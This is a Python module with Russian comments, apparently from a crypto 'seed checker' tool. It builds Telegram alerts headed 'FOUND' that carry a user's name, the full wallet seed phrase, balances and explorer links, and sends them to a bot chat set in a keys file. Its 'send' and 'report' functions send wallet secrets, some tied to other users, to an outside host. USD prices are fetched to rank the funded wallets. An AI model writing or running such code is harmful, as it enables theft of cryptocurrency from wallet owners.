# Telegram-уведомления: "НАЙДЕНО" → пользователь, сид, баланс, ссылка на кошелёк (вход/баланс).
import json, ssl, time, urllib.parse, urllib.request
try:
    import certifi; _CTX = ssl.create_default_context(cafile=certifi.where())   # CA для HTTPS (на сервере нет /etc/ssl/certs)
except Exception:
    _CTX = ssl.create_default_context()
TOKEN = CHAT = None
try:
    import keys as _k
    TOKEN = getattr(_k, "TELEGRAM_TOKEN", None)
    CHAT = getattr(_k, "TELEGRAM_CHAT", None)
except Exception:
    pass

def enabled():
    return bool(TOKEN and CHAT)

# --- цены USD (CoinGecko, кэш 10 мин) для порога масс-уведомлений ---
_PRICES = {"t": 0.0, "p": {}}
_CG = {"bitcoin": "BTC", "ethereum": "ETH", "litecoin": "LTC", "dogecoin": "DOGE", "dash": "DASH", "ethereum-classic": "ETC"}

def prices():
    now = time.time()
    if now - _PRICES["t"] < 600 and _PRICES["p"]:
        return _PRICES["p"]
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=" + ",".join(_CG.keys()) + "&vs_currencies=usd"
        req = urllib.request.Request(url, headers={"User-Agent": "puh-checker"})
        with urllib.request.urlopen(req, timeout=12, context=_CTX) as r:
            d = json.loads(r.read().decode("utf-8", "replace"))
        _PRICES["p"] = {sym: (d.get(cid) or {}).get("usd", 0) for cid, sym in _CG.items()}
        _PRICES["t"] = now
    except Exception:
        pass
    return _PRICES["p"]

def usd(coin, bal):                       # USD-оценка баланса (EVM считаем по ETH — грубо, но не пропустим)
    try:
        return float(bal) * (prices().get(coin, 0) or 0)
    except Exception:
        return 0.0

def _esc(s):
    return (str(s)).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def _explorer(coin, chains, addr):
    c = (chains or "").split(",")[0].strip()
    if coin == "BTC": return "https://blockstream.info/address/" + addr
    if coin == "LTC": return "https://litecoinspace.org/address/" + addr
    if coin == "DOGE": return "https://blockchair.com/dogecoin/address/" + addr
    if coin == "DASH": return "https://blockchair.com/dash/address/" + addr
    if coin == "ETC": return "https://etc.blockscout.com/address/" + addr
    if c == "BSC": return "https://bscscan.com/address/" + addr
    if c == "Polygon": return "https://polygonscan.com/address/" + addr
    return "https://etherscan.io/address/" + addr

def send(text):
    if not enabled(): return False
    try:
        data = urllib.parse.urlencode({"chat_id": CHAT, "text": text, "parse_mode": "HTML",
                                       "disable_web_page_preview": "true"}).encode()
        req = urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data=data)
        with urllib.request.urlopen(req, timeout=15, context=_CTX) as r:
            return r.status == 200
    except Exception:
        return False

def _fbal(b):
    try: return float(b)
    except Exception: return 0.0

def report(title, mode_label, task_name, seed, rows, owner=None):
    """rows: активные/изменившиеся пути {coin,std,path,addr,bal,txn,chains}. Шлёт отчёт, возвращает текст."""
    import time as _t
    when = _t.strftime("%d.%m.%Y %H:%M:%S UTC", _t.gmtime())
    lines = ["🔔 <b>" + title + "</b>" + (f" · {mode_label}" if mode_label else ""),
             f"📋 Задача: <b>{_esc(task_name)}</b>"]
    if owner:
        lines.append(f"👤 Пользователь: {_esc(owner)}")
    lines += [f"🔑 Сид: <code>{_esc(seed)}</code>", f"🕐 Время: {when}", ""]
    for r in rows:
        link = _explorer(r.get("coin", ""), r.get("chains", ""), r.get("addr", ""))
        lines.append(f"🌐 Путь: {_esc(r.get('coin'))} {_esc(r.get('std'))} <code>{_esc(r.get('path'))}</code>")
        lines.append(f"💰 Баланс: <b>{_esc(r.get('bal'))}</b> · tx {r.get('txn', 0)}"
                     + (f" [{_esc(r.get('chains'))}]" if r.get('chains') else ""))
        lines.append(f"🔗 <a href=\"{link}\">{_esc(r.get('addr'))}</a>")
        lines.append("")
    text = "\n".join(lines).strip()
    send(text)
    return text
